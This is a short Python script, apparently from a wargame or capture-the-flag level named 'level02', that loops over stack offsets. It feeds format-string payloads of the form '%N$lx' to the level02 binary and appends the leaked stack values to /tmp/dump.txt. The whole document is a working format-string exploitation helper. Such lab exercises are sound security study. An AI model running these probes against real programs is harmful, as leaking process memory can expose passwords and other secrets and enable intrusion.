import os

for i in range(0, 42):
    os.system("echo -n \"" + str(i) + " | \" >> /tmp/dump.txt")
    os.system("python -c \'print \"%" + str(i) + "$lx" + "\\n\"\'" + " | /home/users/level02/level02 | grep \"does not have access!\" >> /tmp/dump.txt")
